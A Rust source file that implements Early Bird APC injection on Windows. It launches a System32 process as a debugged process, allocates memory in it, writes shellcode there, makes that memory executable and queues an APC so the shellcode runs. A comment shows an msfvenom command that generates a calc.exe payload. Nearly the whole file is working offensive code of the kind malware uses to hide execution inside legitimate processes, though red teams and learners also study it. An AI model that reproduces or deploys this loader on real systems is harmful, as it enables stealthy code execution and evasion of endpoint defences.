use std::ffi::c_void;
use windows::Win32::Foundation::{CloseHandle, HANDLE, INVALID_HANDLE_VALUE, PAPCFUNC};
use windows::Win32::System::Threading::{DEBUG_PROCESS, STARTUPINFOA, PROCESS_INFORMATION, CreateProcessA, QueueUserAPC};
use windows::Win32::System::Diagnostics::Debug::{DebugActiveProcessStop, WriteProcessMemory};
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE, VirtualAllocEx, VirtualProtectEx};
use windows::core::{PSTR};

// msfvenom -p windows/x64/exec CMD=calc.exe -f rust

/// Injects and executes shellcode in a target process using the Early Bird APC injection technique.
///
/// This function performs the following steps:
/// 1. Creates the target process in a suspended state.
/// 2. Allocates memory in the target process and writes the shellcode to it.
/// 3. Changes the memory protection of the allocated region to be executable.
/// 4. Queues an Asynchronous Procedure Call (APC) to the main thread of the target process to execute the shellcode.
/// 5. Detaches the debugger and resumes the target process.
///
/// # Arguments
///
/// * `target` - A string slice that holds the name of the target process (e.g., "notepad.exe").
/// * `shellcode` - A byte slice that contains the shellcode to be injected.
pub fn run(target: &str, shellcode: &[u8]) {
    let target_process = String::from(target);
    println!("[i] Creating {} Process As A Debugged Process ... ", target_process);
    let (dw_process_id, h_process, h_thread) = match create_debugged_process(target_process) {
        Ok((dw_process_id, h_process, h_thread)) => (dw_process_id, h_process, h_thread),
        Err(err) => {
            println!("Error creating suspended process: {}", err);
            std::process::exit(-1);
        }
    };
    println!("[i] Target Process Created With Pid : {}", dw_process_id);
    println!("\t[i] Process Handle: {:?}", h_process);
    println!("\t[i] Thread Handle: {:?}", h_thread);
    println!("[i] Writing Shellcode To The Target Process ... ");

    let p_address = match inject_shellcode_to_remote_process(h_process, shellcode.as_ptr(), shellcode.len()) {
        Ok(val) => val,
        Err(err) => {
            println!("{}. Exiting ...", err);
            std::process::exit(-1);
        }
    };
    println!("[+] Shellcode Written");

    unsafe {
        // std::mem::transmute performs a type cast
        let p_fun_address: PAPCFUNC = std::mem::transmute(p_address);
        QueueUserAPC(p_fun_address, h_thread, 0);
    }

    println!("[#] Press <Enter> To Run Shellcode ... ");
    let _ = std::io::stdin().read_line(&mut String::new());

    println!("[i] Detaching From The Target Process ... ");
    unsafe {
        if let Err(err) = DebugActiveProcessStop(dw_process_id){
            eprintln!("[!] DebugActiveProcessStop Failed With Error : {:?}", err);
        } else {
            println!("[+] Shellcode Executed");
            println!("[#] Press <Enter> To Quit ... ");
            let _ = std::io::stdin().read_line(&mut String::new());
        }
    }
    println!("[i] Closing Handles");
    unsafe {
        CloseHandle(h_process).expect("[!]: Failed To Close Process Handle");
        CloseHandle(h_thread).expect("[!]: Failed To Close Thread Handle");
    }
}

fn inject_shellcode_to_remote_process(h_process: HANDLE, p_shellcode: *const u8, s_shellcode: usize) -> Result<*const c_void, String>{
    let p_address = unsafe {
        VirtualAllocEx(h_process, None, s_shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    };

    if p_address.is_null() {
        let error = format!("[!] VirtualAllocEx Failed With Error: {:?}", std::io::Error::last_os_error());
        return Err(error);
    }
    println!("[i] Allocated Memory At : {:?}", p_address);
    println!("[#] Press <Enter> To Write Payload ... ");
    let _ = std::io::stdin().read_line(&mut String::new());

    unsafe {
        let lp_number_of_bytes_written: Option<*mut usize> = None;
        if let Err(err) = WriteProcessMemory(h_process, p_address, p_shellcode as *const c_void, s_shellcode, lp_number_of_bytes_written) {
            let error = format!("[!] WriteProcessMemory Failed With Error : {:?}", err);
            return Err(error);
        } else {
            println!("[i] Successfully Written {} Bytes", s_shellcode);
        }

        let mut lp_flag_old_protect = PAGE_PROTECTION_FLAGS(0);
        if let Err(err) = VirtualProtectEx(h_process, p_address, s_shellcode, PAGE_EXECUTE_READWRITE, &mut lp_flag_old_protect) {
            let error = format!("[!] VirtualProtectEx Failed With Error : {:?}", err);
            return Err(error)
        } else {
            println!("[i] Successfully Changed Memory Protection");
        }
    }
    Ok(p_address)
}

fn create_debugged_process(target_process: String) -> Result<(u32, HANDLE, HANDLE), String>{
    let mut si = STARTUPINFOA::default();
    let mut pi = PROCESS_INFORMATION::default();
    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

    let windir = match std::env::var("WINDIR") {
        Ok(val) => val,
        Err(_) => {
            println!("WINDIR environment variable not set");
            return Err("CreateProcessA Failed".into());
        }
    };

    let full_process_path = format!("{}\\System32\\{}", windir, target_process);
    println!("[i] Running: {} ...", full_process_path);

    let _process = unsafe{
        CreateProcessA(
            None,
            PSTR(full_process_path.as_ptr() as *mut u8),
            None,
            None,
            false,
            DEBUG_PROCESS,
            None,
            None,
            &mut si,
            &mut pi,
        ).unwrap_or_else(|e| {
            panic!("[!] CreateProcessA Failed With Error: {e}");
        });
    };

    println!("[+] Process {} created", target_process);
    if pi.dwProcessId != 0 && pi.hProcess != INVALID_HANDLE_VALUE && pi.hThread != INVALID_HANDLE_VALUE {
        Ok((pi.dwProcessId, pi.hProcess, pi.hThread))
    } else {
        eprintln!("[!] CreateProcessA Failed to return Process Information");
        return Err("CreateProcessA Failed".into());
    }
}